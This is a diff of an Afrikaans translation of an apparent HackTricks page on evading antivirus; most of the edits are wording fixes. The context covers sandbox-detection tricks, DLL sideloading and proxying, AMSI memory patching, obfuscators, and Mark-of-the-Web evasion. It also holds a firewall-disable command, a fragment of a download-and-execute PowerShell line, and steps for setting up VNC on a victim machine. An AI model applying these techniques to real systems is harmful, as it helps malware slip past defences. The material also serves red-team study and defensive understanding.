@@ -17,19 +17,19 @@ Leer & oefen GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-siz
 
 <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-As jy belangstel in 'n **hacking loopbaan** en om die onhackbare te hack - **ons is op soek na mense!** (_vloeiende Pools geskryf en gesproke vereis_).
+As jy belangstel in 'n **hacking loopbaan** en om die onhackbare te hack - **ons is op soek na mense!** (_vloeiende Pools skriftelik en gesproke vereis_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 **Hierdie bladsy is geskryf deur** [**@m2rc\_p**](https://twitter.com/m2rc_p)**!**
 
-## **AV Ontwyking Metodologie**
+## **AV Ontwyk Metodologie**
 
 Tans gebruik AV's verskillende metodes om te kontroleer of 'n lêer kwaadwillig is of nie, statiese opsporing, dinamiese analise, en vir die meer gevorderde EDR's, gedragsanalise.
 
 ### **Statiese opsporing**
 
-Statiese opsporing word bereik deur bekende kwaadwillige stringe of byte-reekse in 'n binêre of skrip te merk, en ook inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappy naam, digitale handtekeninge, ikoon, kontrole som, ens.). Dit beteken dat die gebruik van bekende openbare gereedskap jou makliker kan laat vang, aangesien hulle waarskynlik geanaliseer en as kwaadwillig gemerk is. Daar is 'n paar maniere om hierdie tipe opsporing te omseil:
+Statiese opsporing word bereik deur bekende kwaadwillige stringe of byte-reekse in 'n binêre of skrip te merk, en ook inligting uit die lêer self te onttrek (bv. lêer beskrywing, maatskappy naam, digitale handtekeninge, ikoon, checksum, ens.). Dit beteken dat die gebruik van bekende openbare gereedskap jou makliker kan laat vang, aangesien hulle waarskynlik geanaliseer en as kwaadwillig gemerk is. Daar is 'n paar maniere om hierdie soort opsporing te omseil:
 
 * **Enkripsie**
 
@@ -37,7 +37,7 @@ As jy die binêre enkripteer, sal daar geen manier wees vir AV om jou program te
 
 * **Obfuskasie**
 
-Soms is al wat jy hoef te doen, om 'n paar stringe in jou binêre of skrip te verander om dit verby AV te kry, maar dit kan 'n tydrowende taak wees, afhangende van wat jy probeer obfuskeer.
+Soms is al wat jy moet doen, om 'n paar stringe in jou binêre of skrip te verander om dit verby AV te kry, maar dit kan 'n tydrowende taak wees, afhangende van wat jy probeer obfuskeer.
 
 * **Pasgemaakte gereedskap**
 
@@ -54,7 +54,7 @@ Ek beveel sterk aan dat jy hierdie [YouTube speellys](https://www.youtube.com/pl
 Dinamiese analise is wanneer die AV jou binêre in 'n sandbox uitvoer en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou blaaskas se wagwoorde te dekripteer en te lees, 'n minidump op LSASS uit te voer, ens.). Hierdie deel kan 'n bietjie moeiliker wees om mee te werk, maar hier is 'n paar dinge wat jy kan doen om sandboxes te ontwyk.
 
 * **Slaap voor uitvoering** Afhangende van hoe dit geïmplementeer is, kan dit 'n wonderlike manier wees om AV se dinamiese analise te omseil. AV's het 'n baie kort tyd om lêers te skandeer om nie die gebruiker se werksvloei te onderbreek nie, so die gebruik van lang slape kan die analise van binêre versteur. Die probleem is dat baie AV's sandboxes eenvoudig die slaap kan oorslaan, afhangende van hoe dit geïmplementeer is.
-* **Kontroleer masjien se hulpbronne** Gewoonlik het sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders kan hulle die gebruiker se masjien vertraag. Jy kan ook baie kreatief wees hier, byvoorbeeld deur die CPU se temperatuur of selfs die waaier spoed te kontroleer, nie alles sal in die sandbox geïmplementeer wees nie.
+* **Kontroleer masjien se hulpbronne** Gewoonlik het sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders kan hulle die gebruiker se masjien stadiger maak. Jy kan ook baie kreatief hier wees, byvoorbeeld deur die CPU se temperatuur of selfs die waaier spoed te kontroleer, nie alles sal in die sandbox geïmplementeer wees nie.
 * **Masjien-spesifieke kontroles** As jy 'n gebruiker wil teiken wie se werkstasie aan die "contoso.local" domein gekoppel is, kan jy 'n kontrole op die rekenaar se domein doen om te sien of dit ooreenstem met die een wat jy gespesifiseer het, as dit nie is nie, kan jy jou program laat verlaat.
 
 Dit blyk dat Microsoft Defender se Sandbox rekenaarnaam HAL9TH is, so jy kan die rekenaarnaam in jou malware kontroleer voor detonering, as die naam ooreenstem met HAL9TH, beteken dit jy is binne defender se sandbox, so jy kan jou program laat verlaat.
@@ -72,7 +72,7 @@ Byvoorbeeld, as jy LSASS wil dump, **het jy regtig nodig om mimikatz te gebruik*
 Die regte antwoord is waarskynlik die laaste. Neem mimikatz as 'n voorbeeld, dit is waarskynlik een van, indien nie die mees gemerkte stuk malware deur AV's en EDR's nie, terwyl die projek self super cool is, is dit ook 'n nagmerrie om daarmee te werk om AV's te omseil, so kyk net vir alternatiewe vir wat jy probeer bereik.
 
 {% hint style="info" %}
-Wanneer jy jou payloads vir ontwyking aanpas, maak seker om **outomatiese monster indiening** in defender af te skakel, en asseblief, ernstig, **LAAT NIE OP VIRUSTOTAL OP NIE** as jou doel is om ontwyking op die lang termyn te bereik. As jy wil kontroleer of jou payload deur 'n spesifieke AV opgespoor word, installeer dit op 'n VM, probeer om die outomatiese monster indiening af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.
+Wanneer jy jou payloads vir ontwyking aanpas, maak seker om **outomatiese monster indiening** in defender af te skakel, en asseblief, ernstig, **LAAT NIE OP NA VIRUSTOTAL OP NIE** as jou doel is om ontwyking op die lang termyn te bereik. As jy wil kyk of jou payload deur 'n spesifieke AV opgespoor word, installeer dit op 'n VM, probeer om die outomatiese monster indiening af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.
 {% endhint %}
 
 ## EXEs vs DLLs
@@ -104,7 +104,7 @@ Hierdie opdrag sal die lys van programme wat vatbaar is vir DLL-hijacking binne 
 
 Ek beveel sterk aan dat jy **DLL Hijackable/Sideloadable programme self verken**, hierdie tegniek is redelik stil as dit reg gedoen word, maar as jy publiek bekende DLL Sideloadable programme gebruik, kan jy maklik gevang word.
 
-Net deur 'n kwaadwillige DLL met die naam wat 'n program verwag om te laai, te plaas, sal jou payload nie laai nie, aangesien die program 'n paar spesifieke funksies binne daardie DLL verwag, om hierdie probleem op te los, sal ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.
+Net deur 'n kwaadwillige DLL met die naam wat 'n program verwag om te laai, te plaas, sal jou payload nie laai nie, aangesien die program 'n paar spesifieke funksies binne daardie DLL verwag. Om hierdie probleem op te los, sal ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.
 
 **DLL Proxying** stuur die oproepe wat 'n program maak van die proxy (en kwaadwillige) DLL na die oorspronklike DLL, wat die program se funksionaliteit behou en in staat is om die uitvoering van jou payload te hanteer.
 
@@ -121,7 +121,7 @@ Hierdie is die stappe wat ek gevolg het:
 ```
 {% endcode %}
 
-Die laaste opdrag sal vir ons 2 lêers gee: 'n DLL bronskode sjabloon, en die oorspronklike hernoemde DLL.
+Die laaste opdrag sal vir ons 2 lêers gee: 'n DLL-bronkode sjabloon, en die oorspronklike hernoemde DLL.
 
 <figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 
@@ -180,7 +180,7 @@ Die uitvoering van `IEX (New-Object Net.WebClient).DownloadString('https://raw.g
 
 Let op hoe dit `amsi:` voorafgaan en dan die pad na die uitvoerbare lêer waarvan die skrip gedraai het, in hierdie geval, powershell.exe
 
-Ons het geen lêer op skyf gelaat nie, maar is steeds in-geheue gevang weens AMSI.
+Ons het nie enige lêer op skyf gelaat nie, maar is steeds in-geheue gevang weens AMSI.
 
 Daar is 'n paar maniere om rondom AMSI te kom:
 
@@ -224,7 +224,7 @@ Hou in gedagte dat dit waarskynlik gemeld sal word sodra hierdie pos uitkom, so 
 
 **Geheue Patching**
 
-Hierdie tegniek is aanvanklik ontdek deur [@RastaMouse](https://twitter.com/_RastaMouse/) en dit behels die vind van die adres vir die "AmsiScanBuffer" funksie in amsi.dll (verantwoordelik vir die skandering van die gebruiker-geleverde invoer) en dit oorskryf met instruksies om die kode vir E\_INVALIDARG terug te gee, sodat die resultaat van die werklike skandering 0 sal wees, wat as 'n skoon resultaat geïnterpreteer word.
+Hierdie tegniek is aanvanklik ontdek deur [@RastaMouse](https://twitter.com/_RastaMouse/) en dit behels die vind van die adres vir die "AmsiScanBuffer" funksie in amsi.dll (verantwoordelik vir die skandering van die gebruiker-gelewer insette) en dit oorskryf met instruksies om die kode vir E\_INVALIDARG terug te gee, sodat die resultaat van die werklike skandering 0 sal wees, wat as 'n skoon resultaat geïnterpreteer word.
 
 {% hint style="info" %}
 Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.
@@ -234,17 +234,17 @@ Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te omsei
 
 Of hierdie skrip wat via geheue patching elke nuwe Powersh sal patch
 
-## Obfuscation
+## Obfuskaasie
 
-Daar is verskeie gereedskap wat gebruik kan word om **C# duidelike tekskode** te **obfuskeer**, **metaprogrammering templates** te genereer om binêre te kompileer of **gecompileerde binêre** te obfuskeer soos:
+Daar is verskeie gereedskap wat gebruik kan word om **C# duidelike tekskode te obfuskeer**, **metaprogrammering templates** te genereer om binêre te kompileer of **gecompileerde binêre te obfuskeer** soos:
 
-* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
-* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n oopbron-fork van die [LLVM](http://www.llvm.org/) kompilasiesuite te bied wat in staat is om verhoogde sagteware-sekuriteit te bied deur middel van [kode obfuskering](http://en.wikipedia.org/wiki/Obfuscation_\(software\)) en tamper-proofing.
-* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om `C++11/14` taal te gebruik om, tydens kompilering, obfuskeerde kode te genereer sonder om enige eksterne gereedskap te gebruik en sonder om die kompilator te wysig.
+* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuskeerder**
+* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n oopbron-fork van die [LLVM](http://www.llvm.org/) kompilasiesuite te bied wat in staat is om verhoogde sagteware-sekuriteit te bied deur middel van [kode obfuskaasie](http://en.wikipedia.org/wiki/Obfuscation_\(software\)) en tamper-proofing.
+* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om `C++11/14` taal te gebruik om, tydens kompilering, obfuskeerde kode te genereer sonder om enige eksterne gereedskap te gebruik en sonder om die kompilateur te wysig.
 * [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuskeerde operasies by wat deur die C++ template metaprogrammering raamwerk gegenereer word wat die lewe van die persoon wat die toepassing wil kraak 'n bietjie moeiliker sal maak.
-* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binêre obfuscator wat in staat is om verskillende pe-lêers te obfuskeer, insluitend: .exe, .dll, .sys
-* [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorfiese kode enjin vir arbitrêre uitvoerbare.
-* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fyn-granulêre kode obfuskeringsraamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer 'n program op die assembly kode vlak deur gewone instruksies in ROP-kettings te transformeer, wat ons natuurlike begrip van normale kontrole vloei verhoed.
+* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binêre obfuskeerder wat in staat is om verskeie verskillende pe-lêers te obfuskeer, insluitend: .exe, .dll, .sys
+* [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorfiese kode enjin vir arbitrêre uitvoerbare lêers.
+* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fyn-gegradeerde kode obfuskaasie raamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer 'n program op die assembly kode vlak deur gewone instruksies in ROP-kettings te transformeer, wat ons natuurlike begrip van normale kontrole vloei verhoed.
 * [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
 * [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is in staat om bestaande EXE/DLL in shellcode te omskakel en dit dan te laai
 
@@ -258,7 +258,7 @@ Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die e
 
 SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken dat ongewoon afgelaaide toepassings SmartScreen sal aktiveer, wat die eindgebruiker waarsku en verhoed om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur op Meer Inligting -> Voer steeds uit te klik).
 
-**MoTW** (Mark of The Web) is 'n [NTFS Alternatiewe Data Stroom](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_\(ADS\)) met die naam van Zone.Identifier wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.
+**MoTW** (Merk van die Web) is 'n [NTFS Alternatiewe Data Stroom](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_\(ADS\)) met die naam van Zone.Identifier wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.
 
 <figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat van die internet afgelaai is.</p></figcaption></figure>
 
@@ -266,11 +266,11 @@ SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken
 Dit is belangrik om te noem dat uitvoerbare lêers wat met 'n **betroubare** ondertekeningssertifikaat **nie SmartScreen sal aktiveer** nie.
 {% endhint %}
 
-'n Baie effektiewe manier om te verhoed dat jou payloads die Mark of The Web kry, is om dit in 'n soort houer soos 'n ISO te verpakkie. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **nie NTFS** volumes toegepas kan word nie.
+'n Baie effektiewe manier om te verhoed dat jou payloads die Merk van die Web kry, is om dit in 'n soort houer soos 'n ISO te verpakkie. Dit gebeur omdat die Merk-van-die-Web (MOTW) **nie** op **nie NTFS** volumes toegepas kan word nie.
 
 <figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n gereedskap wat payloads in uitvoerhouers verpakkie om die Mark-of-the-Web te ontwyk.
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n gereedskap wat payloads in uitvoerhouers verpakkie om die Merk-van-die-Web te ontwyk.
 
 Voorbeeld gebruik:
 ```powershell
@@ -304,7 +304,7 @@ Om C# binêre lêers in geheue te laai is al 'n geruime tyd bekend en dit is ste
 
 Aangesien die payload direk in geheue gelaai sal word sonder om die skyf te raak, sal ons net bekommerd wees oor die patching van AMSI vir die hele proses.
 
-Meeste C2-raamwerke (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:
+Meeste C2 raamwerke (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:
 
 * **Fork\&Run**
 
@@ -314,12 +314,12 @@ Dit behels **die ontstaan van 'n nuwe offer proses**, spuit jou post-exploitatio
 
 * **Inline**
 
-Dit gaan oor die spuit van die post-exploitation kwaadwillige kode **in sy eie proses**. Op hierdie manier kan jy vermy om 'n nuwe proses te skep en dit deur AV te laat skandeer, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is om **jou beacon te verloor** aangesien dit kan neerstort.
+Dit gaan oor die spuit van die post-exploitation kwaadwillige kode **in sy eie proses**. Op hierdie manier kan jy vermy om 'n nuwe proses te skep en dit deur AV te laat skandeer, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is om **jou beacon te verloor** aangesien dit kan crash.
 
 <figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-As jy meer wil lees oor C# Assembly laai, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
+As jy meer oor C# Assembly laai wil lees, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 {% endhint %}
 
 Jy kan ook C# Assemblies **van PowerShell** laai, kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).
@@ -350,7 +350,7 @@ Dit is ook 'n ander goeie praatjie van [@mariuszbit](https://twitter.com/mariusz
 
 ### **Kontroleer watter dele Defender as kwaadwillig vind**
 
-Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat **dele van die binêre lêer sal verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig vind en dit aan jou sal verdeel.\
+Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat **dele van die binêre lêer sal verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig vind en dit aan jou verdeel.\
 Nog 'n hulpmiddel wat die **selfde ding doen is** [**avred**](https://github.com/dobin/avred) met 'n oop web wat die diens aanbied in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 
 ### **Telnet Bediening**
@@ -370,13 +370,13 @@ netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-Download dit van: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin downloads hê, nie die opstelling nie)
+Download dit van: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-aflaai hê, nie die installasie nie)
 
 **OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en konfigureer die bediener:
 
-* Aktiveer die opsie _Disable TrayIcon_
-* Stel 'n wagwoord in _VNC Password_
-* Stel 'n wagwoord in _View-Only Password_
+* Aktiveer die opsie _Deaktiveer TrayIcon_
+* Stel 'n wagwoord in _VNC Wagwoord_
+* Stel 'n wagwoord in _Slegs Kyk Wagwoord_
 
 Beweeg dan die binêre _**winvnc.exe**_ en **nuut** geskepte lêer _**UltraVNC.ini**_ binne die **slagoffer**
 
@@ -571,7 +571,7 @@ https://github.com/praetorian-code/vulcan
 
 <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-As jy belangstel in 'n **hacking loopbaan** en om die onhackbare te hack - **ons huur aan!** (_vloeiende Pools geskryf en gesproke vereis_).
+As jy belangstel in **hacking loopbaan** en die onhackbare hack - **ons huur aan!** (_vloeiende Pools geskryf en gesproke vereis_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
